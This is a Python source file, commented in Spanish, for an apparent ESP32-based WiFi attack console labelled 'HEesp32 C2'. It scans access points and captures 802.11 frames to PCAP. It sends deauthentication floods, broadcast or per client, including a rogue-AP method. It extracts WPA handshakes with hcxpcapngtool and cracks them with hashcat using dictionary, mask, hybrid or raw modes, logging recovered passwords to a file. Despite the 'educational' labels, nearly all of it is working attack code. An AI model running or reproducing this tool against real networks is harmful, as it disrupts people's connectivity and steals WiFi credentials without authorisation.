import serial
import threading
import sys
import time
import re
import subprocess
import os
import glob
from datetime import datetime
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.completion import WordCompleter, Completion, Completer
from prompt_toolkit.formatted_text import HTML

# Importar scapy una sola vez al inicio
try:
    from scapy.all import RadioTap, Dot11, wrpcap
except ImportError:
    print("[!] scapy no está instalado. Instálalo con: pip install scapy")
    sys.exit(1)

SERIAL_PORT = '/dev/ttyUSB0'  # Adjust if needed
BAUD_RATE = 115200

# Comandos disponibles para autocompletado y banner
# NOTA: lock&cap = lock (alias temporal, 1 versión), verify = crack (breaking change)
COMMAND_LIST = ["scan", "stop", "lock&cap", "lock", "deauth", "clients", "crack", "help", "status", "capture", "clear", "port", "ls", "exit", "aps"]

# Diccionario de APs detectados en sesión: bssid -> {channel, rssi, ssid, last_seen}
DETECTED_APS = {}

# Archivo PCAP actual (se puede cambiar con 'capture')
CURRENT_PCAP = "captura_laboratorio.pcap"

# Contador global de tramas capturadas
FRAME_COUNT = 0

# Timestamp de inicio de captura (None si no hay captura activa)
CAPTURE_START_TIME = None

# Evento para manejar el cierre limpio de los hilos
exit_event = threading.Event()

def get_next_pcap_filename(base_name: str) -> str | None:
    """
    Devuelve el siguiente nombre de archivo PCAP disponible.
    Si base_name no existe, lo retorna tal cual.
    Si existe, añade sufijo numérico _001, _002, ... _999.
    Si se alcanza _999, retorna None y muestra advertencia.
    """
    # Asegurar extensión .pcap
    if not base_name.lower().endswith('.pcap'):
        base_name += '.pcap'
    
    if not os.path.exists(base_name):
        return base_name
    
    # Separar nombre base y extensión
    root, ext = os.path.splitext(base_name)
    
    # Buscar archivos existentes con patrón root_XXX.pcap
    pattern = f"{root}_[0-9][0-9][0-9]{ext}"
    existing = glob.glob(pattern)
    
    # Extraer números de los sufijos
    max_num = 0
    for f in existing:
        # f = root_XXX.pcap
        try:
            num_part = os.path.basename(f).replace(root + '_', '').replace(ext, '')
            num = int(num_part)
            if num > max_num:
                max_num = num
        except ValueError:
            continue
    
    # Probar desde 001 hasta 999
    for i in range(1, 1000):
        candidate = f"{root}_{i:03d}{ext}"
        if not os.path.exists(candidate):
            return candidate
    
    # Si llega aquí, no hay números disponibles
    print(f"[!] Límite de 999 archivos alcanzado para {base_name}")
    return None

def format_file_size(bytes_size: int) -> str:
    """Convierte bytes a string legible (KB, MB, GB)."""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes_size < 1024.0:
            return f"{bytes_size:.1f} {unit}" if unit != 'B' else f"{bytes_size} B"
        bytes_size /= 1024.0
    return f"{bytes_size:.1f} TB"

def list_pcaps() -> None:
    """Lista todos los archivos .pcap en el directorio actual con tamaño y fecha."""
    pcaps = sorted(glob.glob("*.pcap"))
    if not pcaps:
        print("[*] No hay archivos PCAP en el directorio actual.")
        return
    
    print("=== Capturas PCAP disponibles ===")
    for pcap in pcaps:
        size = os.path.getsize(pcap)
        mtime = os.path.getmtime(pcap)
        date_str = datetime.fromtimestamp(mtime).strftime('%Y-%m-%d %H:%M')
        size_str = format_file_size(size)
        print(f"{pcap:30} {size_str:>10}   {date_str}")

def listener_thread(ser: serial.Serial) -> None:
    """Hilo encargado de escuchar el puerto serie e imprimir."""
    global FRAME_COUNT, DETECTED_APS
    buffer = bytearray()
    # Regex formato nuevo (con RSSI)
    beacon_regex_new = re.compile(
        r'\[BEACON\]\s+CH:\s*(\d+)\s*\|\s*RSSI:\s*(-?\d+)\s*\|\s*BSSID:\s*([0-9A-Fa-f:]+)\s*\|\s*SSID:\s*(.+)'
    )
    # Regex formato viejo (sin RSSI) - fallback
    beacon_regex_old = re.compile(
        r'\[BEACON\]\s+CH:\s*(\d+)\s*\|\s*BSSID:\s*([0-9A-Fa-f:]+)\s*\|\s*SSID:\s*(.+)'
    )
    try:
        while not exit_event.is_set():
            if ser.in_waiting > 0:
                data = ser.read(ser.in_waiting)
                buffer.extend(data)
                
                # Procesar líneas completas
                while b'\n' in buffer:
                    line_bytes = buffer.split(b'\n', 1)[0]
                    buffer = buffer.split(b'\n', 1)[1]
                    
                    try:
                        line = line_bytes.decode('utf-8', errors='ignore').strip()
                    except Exception:
                        continue
                        
                    if not line:
                        continue
                        
                    # Detectar y parsear beacons para almacenar APs
                    beacon_match = beacon_regex_new.match(line)
                    if beacon_match:
                        ch = int(beacon_match.group(1))
                        rssi = int(beacon_match.group(2))
                        bssid = beacon_match.group(3).upper()
                        ssid = beacon_match.group(4).strip()
                        now = time.time()
                        if bssid not in DETECTED_APS or rssi > DETECTED_APS[bssid]["rssi"]:
                            DETECTED_APS[bssid] = {
                                "channel": ch,
                                "rssi": rssi,
                                "ssid": ssid,
                                "last_seen": now
                            }
                    else:
                        # Fallback: formato viejo sin RSSI
                        beacon_match_old = beacon_regex_old.match(line)
                        if beacon_match_old:
                            ch = int(beacon_match_old.group(1))
                            bssid = beacon_match_old.group(2).upper()
                            ssid = beacon_match_old.group(3).strip()
                            now = time.time()
                            if bssid not in DETECTED_APS:
                                DETECTED_APS[bssid] = {
                                    "channel": ch,
                                    "rssi": 0,  # Desconocido
                                    "ssid": ssid,
                                    "last_seen": now
                                }

                    if line.startswith("[RAW] "):
                        hex_str = line[6:].strip()
                        try:
                            buffer_bytes = bytes.fromhex(hex_str)
                            pkt = RadioTap()/Dot11(buffer_bytes)
                            wrpcap(CURRENT_PCAP, pkt, append=True)
                            FRAME_COUNT += 1
                            print(f"[+] Trama #{FRAME_COUNT} registrada en {CURRENT_PCAP}")
                        except Exception as e:
                            print(f"[!] Error procesando trama RAW: {e}")
                    else:
                        print(f"[ESP32] {line}")
            else:
                time.sleep(0.01)
    except serial.SerialException as e:
        if not exit_event.is_set():
            print(f"\n[!] Error de lectura serial: {e}")
    except Exception as e:
        if not exit_event.is_set():
            print(f"\n[!] Error en listener: {e}")

def print_command_banner() -> None:
    """Imprime la línea de comandos disponibles para el prompt."""
    print(f"[{'|'.join(COMMAND_LIST)}]")

def print_aps_table() -> None:
    """Imprime la tabla de APs detectados ordenada por RSSI (mejor primero)."""
    if not DETECTED_APS:
        print("[*] No se han detectado APs en esta sesión.")
        return
    
    sorted_aps = sorted(DETECTED_APS.items(), key=lambda x: x[1]["rssi"], reverse=True)
    
    print("=== APs Detectados (sesión actual) ===")
    print(f"{'RSSI':>5}  {'CH':>3}  {'BSSID':<18}  {'SSID'}")
    print("-" * 55)
    for bssid, info in sorted_aps:
        ssid_display = info["ssid"] if info["ssid"] != "<oculto>" else "<oculto>"
        print(f"{info['rssi']:>5}  {info['channel']:>3}  {bssid:<18}  {ssid_display}")

def print_help() -> None:
    """Muestra la ayuda completa de comandos."""
    print("=== HEesp32 C2 - Comandos Disponibles ===")
    print("scan                    - Escanear redes WiFi (channel hopping)")
    print("stop                    - Detener operación actual")
    print("lock&cap <MAC> <CANAL>  - Fijar canal y capturar tráfico (alias temp: 'lock')")
    print("deauth <AP_MAC> --client <MAC>|--broadcast --reason <1-255> [--count N] [--delay ms] [--method direct|rogue]")
    print("                               - Enviar frames de deauthentication (educativo)")
    print("clients <MAC>                - Detectar clientes asociados a un AP")
    print("crack <modo> <pcap> <objetivo> [opciones] - Crackear handshake WPA/WPA2")
    print("  Modos:")
    print("    dict <archivo>              - Ataque por diccionario (ej: rockyou.txt)")
    print("    brute <máscara>             - Fuerza bruta (ej: '?d?d?d?d?d?d?d?d')")
    print("    hybrid <dict> <máscara>    - Híbrido: diccionario + máscara")
    print("    raw <args...>              - Modo experto: flags crudos hashcat")
    print("  Opciones:")
    print("    --rules <archivo>           - Aplicar reglas .rule al diccionario")
    print("    --gpu-temp <N>              - Límite temperatura GPU (°C)")
    print("    --speed <N>                 - Limitar rendimiento (%)")
    print("    --show                      - Mostrar contraseñas crackeadas")
    print("    --restore                   - Reanudar sesión interrumpida")
    print("  Ejemplos:")
    print("    crack dict captura.pcap rockyou.txt")
    print("    crack dict captura.pcap rockyou.txt --rules best64.rule")
    print("    crack brute captura.pcap '?d?d?d?d?d?d?d?d'")
    print("status                  - Mostrar estado actual del dispositivo")
    print("capture [nombre]        - Configurar archivo de captura PCAP")
    print("capture ls              - Listar capturas PCAP disponibles")
    print("capture rm <archivo>    - Eliminar captura PCAP")
    print("capture new             - Crear nueva captura con sufijo automático")
    print("port <puerto>           - Cambiar puerto serie (ej: /dev/ttyUSB1)")
    print("ls                      - Listar capturas PCAP (atajo)")
    print("clear                   - Limpiar pantalla")
    print("aps                     - Listar APs detectados en sesión actual (ordenados por RSSI)")
    print("help                    - Mostrar esta ayuda")
    print("exit                    - Salir del programa")

class APCompleter(Completer):
    """Completer dinámico: comandos en prompt vacío, APs tras 'lock ' o 'clients '."""
    
    def __init__(self, commands, **kwargs):
        self.commands = commands
        self.ignore_case = kwargs.get('ignore_case', True)
    
    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        text_stripped = text.strip()
        text_lower = text_stripped.lower()
        
        # Detectar si estamos en contexto de lock&cap/lock/clients con espacio
        if text_lower.startswith("lock&cap ") or text_lower.startswith("lock ") or text_lower.startswith("clients "):
            # Contexto AP: solo sugerir APs detectados
            if DETECTED_APS:
                sorted_aps = sorted(DETECTED_APS.items(), key=lambda x: x[1]["rssi"], reverse=True)
                for bssid, info in sorted_aps:
                    ssid_display = info["ssid"] if info["ssid"] != "<oculto>" else "<oculto>"
                    display_text = f"{bssid} ({ssid_display}) [RSSI:{info['rssi']}]"
                    if text_lower.startswith("lock&cap ") or text_lower.startswith("lock "):
                        suggestion = f"{bssid} {info['channel']}"
                    else:
                        suggestion = bssid
                    # Calcular start_position desde la última palabra
                    words = text.split()
                    if words:
                        last_word = words[-1]
                        start_pos = -len(last_word)
                    else:
                        start_pos = 0
                    yield Completion(suggestion, start_position=start_pos, display=display_text)
            # Si no hay APs, no sugerir nada (evitar COMMAND_LIST)
            return
        
        # Contexto normal: sugerir comandos
        word_before_cursor = text_stripped.split()[-1] if text_stripped.split() else text_stripped
        for cmd in self.commands:
            if self.ignore_case:
                if cmd.lower().startswith(word_before_cursor.lower()):
                    yield Completion(cmd, start_position=-len(word_before_cursor), display=cmd)
            else:
                if cmd.startswith(word_before_cursor):
                    yield Completion(cmd, start_position=-len(word_before_cursor), display=cmd)

def parse_and_send_cmd(cmd_input: str, ser: serial.Serial) -> bool:
    """
    Parsea el comando humano y lo envía formateado al ESP32.
    Retorna False si el usuario quiere salir, True en caso contrario.
    """
    cmd_input = cmd_input.strip().lower()
    
    global CURRENT_PCAP, SERIAL_PORT, FRAME_COUNT, CAPTURE_START_TIME
    
    if cmd_input == "scan":
        # Auto-rotar PCAP si ya existe para no sobrescribir
        rotated = get_next_pcap_filename(CURRENT_PCAP)
        if rotated and rotated != CURRENT_PCAP:
            CURRENT_PCAP = rotated
        print(f"[*] Capturando en: {CURRENT_PCAP}")
        CAPTURE_START_TIME = time.time()
        ser.write(b"CMD:SCAN\n")
    elif cmd_input == "stop":
        CAPTURE_START_TIME = None
        ser.write(b"CMD:IDLE\n")
    # Alias temporal: lock → lock&cap (warning + ejecutar igual)
    lock_cmd = cmd_input.startswith("lock&cap") or cmd_input.startswith("lock")
    lock_obsolete = cmd_input.startswith("lock ") and not cmd_input.startswith("lock&cap")
    
    if lock_obsolete:
        print("[!] 'lock' obsoleto. Usa 'lock&cap' (fijar + capturar).")
    
    if lock_cmd:
        if cmd_input == "lock&cap" or cmd_input == "lock":
            # lock sin argumentos -> mostrar APs detectados como sugerencias
            print("[*] APs detectados en sesión (usa uno para lock&cap <MAC> <CANAL>):")
            print_aps_table()
        elif cmd_input.startswith("lock&cap ") or cmd_input.startswith("lock "):
            # Expected: lock&cap A1:B2:C3:D4:E5:F6 6
            match = re.match(r"lock&cap\s+([0-9a-fA-F:]+)\s+(\d+)", cmd_input)
            if not match:
                match = re.match(r"lock\s+([0-9a-fA-F:]+)\s+(\d+)", cmd_input)
            if match:
                mac = match.group(1).upper()
                channel = match.group(2)
                # Validar MAC rudimentario (6 octetos)
                if len(mac.split(':')) == 6:
                    # Auto-rotar PCAP si ya existe
                    rotated = get_next_pcap_filename(CURRENT_PCAP)
                    if rotated and rotated != CURRENT_PCAP:
                        CURRENT_PCAP = rotated
                    formatted_cmd = f"CMD:LOCK:{mac}:{channel}\n"
                    print(f"[*] Capturando en: {CURRENT_PCAP}")
                    CAPTURE_START_TIME = time.time()
                    ser.write(formatted_cmd.encode('utf-8'))
                else:
                    print("[!] MAC inválida. Formato esperado: AA:BB:CC:DD:EE:FF (6 octetos separados por ':')")
            else:
                print("[!] Uso: lock&cap <MAC> <CANAL>  (ejemplo: lock&cap AA:BB:CC:DD:EE:FF 6)")
    elif cmd_input.startswith("deauth"):
        # Nuevo formato: deauth <ap_mac> --client <mac>|--broadcast --reason <1-255> [--count N] [--delay ms]
        # Ej: deauth AA:BB:CC:DD:EE:FF --broadcast --reason 7 --count 10 --delay 100
        mac_pattern = r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$'
        
        parts = cmd_input.split()
        if len(parts) < 2:
            print("[!] Uso: deauth <AP_MAC> --client <MAC>|--broadcast --reason <1-255> [--count N] [--delay ms]")
            print("     Ej: deauth AA:BB:CC:DD:EE:FF --broadcast --reason 7 --count 10 --delay 100")
            return True
        
        ap_mac = parts[1].upper()
        if not re.match(mac_pattern, ap_mac):
            print("[!] MAC del AP inválida. Formato: AA:BB:CC:DD:EE:FF")
            return True
        
        # Parsear flags
        client_mac = None
        broadcast = False
        reason = 7  # Default: Class 3 frame received
        count = 10  # Default
        delay = 100  # Default ms
        method = "direct"  # Default: inyección directa
        
        i = 2
        while i < len(parts):
            if parts[i] == "--broadcast":
                broadcast = True
            elif parts[i] == "--client" and i + 1 < len(parts):
                client_mac = parts[i + 1].upper()
                if not re.match(mac_pattern, client_mac):
                    print("[!] MAC del cliente inválida. Formato: AA:BB:CC:DD:EE:FF")
                    return True
                i += 1
            elif parts[i] == "--reason" and i + 1 < len(parts):
                try:
                    reason = int(parts[i + 1])
                    if not (1 <= reason <= 255):
                        print("[!] Reason code debe estar entre 1 y 255")
                        return True
                except ValueError:
                    print("[!] Reason code debe ser un número entero")
                    return True
                i += 1
            elif parts[i] == "--count" and i + 1 < len(parts):
                try:
                    count = int(parts[i + 1])
                    if not (1 <= count <= 50):
                        print("[!] Count debe estar entre 1 y 50 (límite pedagógico)")
                        return True
                except ValueError:
                    print("[!] Count debe ser un número entero")
                    return True
                i += 1
            elif parts[i] == "--delay" and i + 1 < len(parts):
                try:
                    delay = int(parts[i + 1])
                    if not (10 <= delay <= 5000):
                        print("[!] Delay debe estar entre 10 y 5000 ms")
                        return True
                except ValueError:
                    print("[!] Delay debe ser un número entero")
                    return True
                i += 1
            elif parts[i] == "--method" and i + 1 < len(parts):
                method = parts[i + 1].lower()
                if method not in ["direct", "rogue"]:
                    print("[!] Method debe ser 'direct' o 'rogue'")
                    return True
                i += 1
            else:
                print(f"[!] Flag desconocido: {parts[i]}")
                return True
            i += 1
        
        # Determinar MAC del cliente
        if broadcast:
            client_mac = "FF:FF:FF:FF:FF:FF"
        elif client_mac is None:
            # Por defecto, broadcast si no se especifica cliente
            client_mac = "FF:FF:FF:FF:FF:FF"
            print("[*] Sin --client especificado, usando broadcast")
        
        # Construir comando para firmware
        # Formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS:METHOD
        formatted_cmd = f"CMD:DEAUTH:{ap_mac}:{client_mac}:{reason}:{count}:{delay}:{method}\n"
        
        # Log pedagógico
        reason_desc = {1: "Unspecified", 2: "Previous auth invalid", 7: "Class 3 frame from nonassoc STA"}
        reason_text = reason_desc.get(reason, f"Custom ({reason})")
        method_desc = "Inyección directa" if method == "direct" else "Rogue AP duplicado"
        print(f"[*] DEAUTH → AP: {ap_mac} | Client: {client_mac}")
        print(f"[*] Reason: {reason_text} | Frames: {count} | Delay: {delay}ms | Method: {method_desc}")
        
        if method == "rogue":
            print(f"[!] Rogue AP: Esperando que el cliente se conecte al AP falso...")
        else:
            print(f"[*] Enviando frames de deauthentication (vulnerabilidad 802.11)")
        
        ser.write(formatted_cmd.encode('utf-8'))
    elif cmd_input == "clients":
        # clients sin argumentos -> mostrar APs detectados como sugerencias
        print("[*] APs detectados en sesión (usa uno para clients <MAC>):")
        print_aps_table()
    elif cmd_input.startswith("clients "):
        # clients AA:BB:CC:DD:EE:FF
        match = re.match(r"clients\s+([0-9a-fA-F:]+)", cmd_input)
        if match:
            mac = match.group(1).upper()
            if len(mac.split(':')) == 6:
                formatted_cmd = f"CMD:CLIENTS:{mac}\n"
                print("[*] Buscando clientes asociados al AP...")
                ser.write(formatted_cmd.encode('utf-8'))
            else:
                print("[!] MAC inválida. Formato esperado: AA:BB:CC:DD:EE:FF (6 octetos separados por ':')")
        else:
            print("[!] Uso: clients <MAC>  (ejemplo: clients AA:BB:CC:DD:EE:FF)")
    elif cmd_input.startswith("crack") or cmd_input.startswith("verify"):
        # Alias temporal: 'verify' → 'crack' con warning
        if cmd_input.startswith("verify"):
            print("[!] 'verify' obsoleto. Usa 'crack' (comando renombrado por claridad pedagógica).")
        
        parts = cmd_input.split()
        if len(parts) < 3:
            print("[!] Uso: crack <modo> <pcap> <objetivo> [opciones]")
            print("  Modos: dict <diccionario>, brute <máscara>, hybrid <dict> <máscara>, raw <args...>")
            print("  Opciones: --rules <archivo>, --gpu-temp <N>, --speed <N>, --show, --restore")
            print("  Ejemplo: crack dict captura.pcap rockyou.txt --rules best64.rule")
            return True
        
        # Detectar modo (primer argumento tras crack/verify)
        mode = parts[1].lower() if len(parts) > 1 else ""
        
        if mode not in ["dict", "brute", "hybrid", "raw"]:
            print("[!] Modo inválido. Modos: dict, brute, hybrid, raw")
            print("[*] Ejemplo: crack dict captura.pcap rockyou.txt")
            return True
        
        # Parsear pcap y objetivo según modo
        pcap_file = parts[2] if len(parts) > 2 else ""
        if not pcap_file:
            print(f"[!] Uso: crack {mode} <archivo_pcap> <objetivo>")
            return True
        
        # Validar existencia de PCAP
        if not os.path.exists(pcap_file):
            print(f"[!] Archivo PCAP no encontrado: {pcap_file}")
            return True
        
        # Parsear opciones adicionales (flags)
        extra_args = []
        rules_file = None
        gpu_temp = None
        speed = None
        show_mode = False
        restore_mode = False
        
        i = 3
        while i < len(parts):
            if parts[i] == "--rules" and i + 1 < len(parts):
                rules_file = parts[i + 1]
                i += 2
            elif parts[i] == "--gpu-temp" and i + 1 < len(parts):
                try:
                    gpu_temp = int(parts[i + 1])
                except ValueError:
                    print("[!] --gpu-temp requiere un número (temperatura en °C)")
                    return True
                i += 2
            elif parts[i] == "--speed" and i + 1 < len(parts):
                try:
                    speed = int(parts[i + 1])
                except ValueError:
                    print("[!] --speed requiere un número (porcentaje 1-100)")
                    return True
                i += 2
            elif parts[i] == "--show":
                show_mode = True
                i += 1
            elif parts[i] == "--restore":
                restore_mode = True
                i += 1
            else:
                # Flags desconocidos o argumentos extra se pasan como-is a hashcat
                extra_args.append(parts[i])
                i += 1
        
        # === MODO --SHOW: Mostrar contraseñas crackeadas ===
        if show_mode:
            potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
            if not os.path.exists(potfile):
                potfile = "hashcat.potfile"
            
            if os.path.exists(potfile):
                print(f"=== Contraseñas Crackeadas (hashcat.potfile) ===")
                try:
                    with open(potfile, 'r') as f:
                        lines = f.readlines()
                    if lines:
                        for line in lines:
                            print(line.strip())
                    else:
                        print("[*] No hay contraseñas crackeadas en el potfile.")
                except Exception as e:
                    print(f"[!] Error leyendo potfile: {e}")
            else:
                print("[*] No se encontró hashcat.potfile. ¿Hashcat nunca ejecutado?")
            return True
        
        # === MODO --RESTORE: Reanudar sesión interrumpida ===
        if restore_mode:
            print("[*] Reanudando sesión hashcat interrumpida...")
            try:
                result = subprocess.run(["hashcat", "--restore", "--quiet"], 
                                      capture_output=False)
                if result.returncode == 0:
                    print("[+] Sesión restaurada correctamente.")
                else:
                    print("[!] No se pudo restaurar la sesión. ¿Sesión previa?")
            except FileNotFoundError:
                print("[!] hashcat no encontrado en el PATH.")
            except Exception as e:
                print(f"[!] Error restaurando sesión: {e}")
            return True
        
        # === Extracción de handshake ===
        print(f"[*] Extrayendo hashes de {pcap_file}...")
        hashfile = "hash.hc22000"
        
        try:
            result = subprocess.run(
                ["hcxpcapngtool", "-o", hashfile, pcap_file],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                # hcxpcapngtool puede fallar silenciosamente si no hay handshake
                if result.stderr:
                    print(f"[*] hcxpcapngtool: {result.stderr.strip()}")
        except FileNotFoundError:
            print("[!] hcxpcapngtool no encontrado. Instálalo con: sudo apt install hcxtools")
            return True
        except Exception as e:
            print(f"[!] Error ejecutando hcxpcapngtool: {e}")
            return True
        
        if not os.path.exists(hashfile) or os.path.getsize(hashfile) == 0:
            print("[!] No se encontró un Handshake completo y válido en el archivo PCAP.")
            print("[*] Asegúrate de que el PCAP contenga tráfico 802.11 con mensajes EAPOL.")
            return True
        
        print(f"[*] Handshake extraído → {hashfile}")
        
        # === Construir comando hashcat ===
        hashcat_cmd = ["hashcat"]
        
        # Modo de ataque (-a)
        attack_modes = {"dict": "0", "brute": "3", "hybrid": "6", "raw": "3"}  # raw usa 3 por defecto
        if mode != "raw":
            hashcat_cmd.extend(["-a", attack_modes[mode]])
        
        # Modo hash (-m 22000 = WPA/WPA2)
        hashcat_cmd.extend(["-m", "22000"])
        
        # Archivos: hashfile + objetivo según modo
        if mode == "dict":
            target = parts[3] if len(parts) > 3 else ""
            if not target or not os.path.exists(target):
                print(f"[!] Diccionario no encontrado: {target}")
                return True
            hashcat_cmd.extend([hashfile, target])
            
        elif mode == "brute":
            mask = parts[3] if len(parts) > 3 else ""
            if not mask:
                print("[!] Uso: crack brute <pcap> <máscara>  (ej: '?d?d?d?d?d?d?d?d')")
                return True
            # Validar máscara (solo caracteres hashcat válidos)
            valid_mask_chars = set("?d?l?u?a?s?b?h?H?D?L?U?A?S?B?1?2?3?4?5?6?7?8?9?0")
            mask_clean = mask.replace(" ", "")
            for c in mask_clean:
                if c.isalnum() or c in "?_-":
                    continue
                if c not in valid_mask_chars:
                    print(f"[!] ¿Máscara válida? Sintaxis hashcat: ?d(dígito), ?l(min), ?u(may), ?a(todos)")
                    return True
            hashcat_cmd.extend([hashfile, mask])
            
        elif mode == "hybrid":
            if len(parts) < 4:
                print("[!] Uso: crack hybrid <pcap> <diccionario> <máscara>")
                return True
            dict_file = parts[3]
            mask = parts[4] if len(parts) > 4 else "?d?d?d?d?d?d?d?d"
            if not os.path.exists(dict_file):
                print(f"[!] Diccionario no encontrado: {dict_file}")
                return True
            hashcat_cmd.extend([hashfile, dict_file, mask])
            
        elif mode == "raw":
            # Modo experto: pasar argumentos crudos
            raw_args = parts[2:]  # Todo después de 'crack raw'
            hashcat_cmd.extend(raw_args)
        
        # Aplicar reglas si se especificó
        if rules_file:
            if not os.path.exists(rules_file):
                # Buscar en ~/.hashcat/rules/ y ./rules/
                search_paths = [
                    rules_file,
                    os.path.join(os.path.expanduser("~"), ".hashcat", "rules", rules_file),
                    "./rules/" + rules_file,
                    ".hashcat/rules/" + rules_file
                ]
                found = False
                for path in search_paths:
                    if os.path.exists(path):
                        rules_file = path
                        found = True
                        break
                if not found:
                    print(f"[!] Archivo de reglas no encontrado: {rules_file}")
                    return True
            hashcat_cmd.extend(["-r", rules_file])
            print(f"[*] Aplicando reglas: {rules_file}")
        
        # Opciones de temperatura GPU
        if gpu_temp is not None:
            hashcat_cmd.extend([f"--gpu-temp-abort={gpu_temp}"])
            print(f"[*] Límite temperatura GPU: {gpu_temp}°C")
        
        # Opciones de speed (--speed-only o limitación porcentaje)
        if speed is not None:
            # hashcat no tiene limitación de speed directo, solo --speed-only
            # Interpretamos --speed como orientación pedagógica
            if speed <= 20:
                hashcat_cmd.append("--speed-only")
                print(f"[*] Modo: --speed-only (rendimiento mínimo para evitar sobrecalentamiento)")
            elif speed <= 50:
                # Solo mostrar progreso, sin limitación
                print(f"[*] Limitación: {speed}% (mostrando progreso optimizado)")
            else:
                print(f"[*] Speed: {speed}% (hashcat ejecutándose a plena potencia)")
        
        # Flags adicionales del usuario
        if extra_args:
            hashcat_cmd.extend(extra_args)
        
        # === Ejecutar hashcat con progreso en tiempo real ===
        print(f"\n[🔓] Iniciando hashcat...")
        print(f"[*] Comando: {' '.join(hashcat_cmd)}\n")
        
        try:
            # Usar Popen para capturar output en tiempo real
            process = subprocess.Popen(
                hashcat_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            cracked_password = None
            progress_line = ""
            
            # Leer output línea a línea con regex de progreso hashcat
            # Formato: Speed.#1     1234.5 kH/s (XXX.Y ZH/Y) Time...
            progress_regex = re.compile(
                r'Speed\.\s*(\d+).*\s+Time:\s*(\d+):(\d+):(\d+)'
            )
            
            for line in process.stdout:
                print(line, end='')  # Mostrar todo el output para verbose
                
                # Detectar crack exitoso
                if "Cracked" in line or "Password" in line.lower():
                    # Extraer contraseña de output tipo: "1bc2d3e4:Password123"
                    match = re.search(r':([^\s:]+)$', line.strip())
                    if match:
                        cracked_password = match.group(1)
                
                # Detener si proceso termina
                if process.poll() is not None:
                    break
            
            # Resultado final
            if process.returncode == 0 or cracked_password:
                if cracked_password:
                    print(f"\n[🔓] ¡ÉXITO! Contraseña crackeada: '{cracked_password}'")
                    # Guardar en cracked.txt
                    with open("cracked.txt", "a") as f:
                        f.write(f"{pcap_file}:{cracked_password}\n")
                    print(f"[*] Guardado en cracked.txt")
                else:
                    print("\n[*] Hashcat completado. ¿No crackeado?")
                    print("[!] Sugerencia: prueba con --rules best64.rule")
            elif process.returncode == 255:
                print("\n[!] Hashcat interrompido por el usuario (Ctrl+C)")
            elif process.returncode == 1:
                print("\n[!] Error en hashcat. Revisa el output superior.")
            else:
                print(f"\n[!] Hashcat finalizado con código: {process.returncode}")
                
        except FileNotFoundError:
            print("[!] hashcat no encontrado en el PATH.")
            print("[*] Instálalo con: sudo apt install hashcat")
        except KeyboardInterrupt:
            print("\n[!] Interrumpido por el usuario.")
            # Opcional: --restore para continuar después
            print("[*] Para reanudar más tarde: crack --restore")
        except Exception as e:
            print(f"[!] Error ejecutando hashcat: {e}")
    elif cmd_input in ["exit", "quit"]:
        ser.write(b"CMD:IDLE\n") # Detener primero
        print("Saliendo...")
        return False
    elif cmd_input == "help":
        print_help()
    elif cmd_input == "status":
        # Solicitar estado al ESP32
        ser.write(b"CMD:STATUS\n")
        print(f"[*] Puerto serie: {SERIAL_PORT}")
        print(f"[*] Baud rate: {BAUD_RATE}")
        print(f"[*] Archivo PCAP actual: {CURRENT_PCAP}")
        print(f"[*] Hilo listener activo: {'Sí' if threading.active_count() > 1 else 'No'}")
        print(f"[*] Tramas capturadas: {FRAME_COUNT}")
        if CAPTURE_START_TIME is not None:
            elapsed = int(time.time() - CAPTURE_START_TIME)
            print(f"[*] Tiempo de captura activa: {elapsed} segundos")
        else:
            print(f"[*] Tiempo de captura activa: No activa")
    elif cmd_input.startswith("capture"):
        parts = cmd_input.split()
        if len(parts) == 1:
            # Mostrar archivo actual y listar capturas
            print(f"[*] Archivo PCAP actual: {CURRENT_PCAP}")
            list_pcaps()
        elif parts[1] == "ls":
            list_pcaps()
        elif parts[1] == "rm":
            if len(parts) < 3:
                print("[!] Uso: capture rm <archivo>")
                return True
            filename = parts[2]
            if not filename.endswith('.pcap'):
                filename += '.pcap'
            if not os.path.exists(filename):
                print(f"[!] Archivo {filename} no encontrado.")
                return True
            # Confirmación sin conflicto con patch_stdout
            print(f"[?] ¿Eliminar {filename}? (s/n): ", end='', flush=True)
            try:
                # Usar input() que funciona correctamente con prompt_toolkit
                confirm = input().strip().lower()
            except (EOFError, KeyboardInterrupt):
                confirm = ''
            except Exception:
                confirm = ''
            if confirm == 's':
                try:
                    os.remove(filename)
                    print(f"[+] Archivo {filename} eliminado.")
                    if CURRENT_PCAP == filename:
                        CURRENT_PCAP = "captura_laboratorio.pcap"
                        print(f"[*] Archivo actual cambiado a {CURRENT_PCAP}")
                except Exception as e:
                    print(f"[!] Error eliminando archivo: {e}")
            else:
                print("[*] Cancelado.")
        elif parts[1] == "new":
            # Forzar nuevo archivo con sufijo automático
            base = CURRENT_PCAP
            # Si ya tiene sufijo _XXX, quitarlo para usar el nombre base original
            match = re.match(r'(.+?)_\d{3}\.pcap$', base)
            if match:
                base = match.group(1) + '.pcap'
            new_file = get_next_pcap_filename(base)
            if new_file is None:
                print("[!] No se pudo generar nuevo nombre de archivo.")
                return True
            CURRENT_PCAP = new_file
            print(f"[+] Nuevo archivo PCAP configurado: {CURRENT_PCAP}")
        else:
            # Nombre de captura proporcionado
            new_name = parts[1]
            # Aplicar sufijo automático si ya existe
            new_file = get_next_pcap_filename(new_name)
            if new_file is None:
                print("[!] No se pudo generar nombre de archivo disponible.")
                return True
            CURRENT_PCAP = new_file
            print(f"[+] Archivo PCAP configurado: {CURRENT_PCAP}")
    elif cmd_input.startswith("port"):
        parts = cmd_input.split()
        if len(parts) == 1:
            print(f"[*] Puerto serie actual: {SERIAL_PORT}")
        else:
            new_port = parts[1]
            print(f"[!] Cambio de puerto requiere reinicio de conexión. Use 'exit' y vuelva a ejecutar.")
            print(f"[*] Nuevo puerto configurado (no efectivo aún): {new_port}")
    elif cmd_input == "clear":
        os.system('clear')
    elif cmd_input == "ls":
        list_pcaps()
    elif cmd_input == "aps":
        print_aps_table()
    elif cmd_input == "":
        pass
    else:
        print(f"[!] Comando no reconocido. Use 'help' para ver la sintaxis completa.")
    
    # Mostrar banner después de cualquier comando (excepto exit y vacío)
    if cmd_input not in ["exit", "quit", ""]:
        print_command_banner()
    
    return True

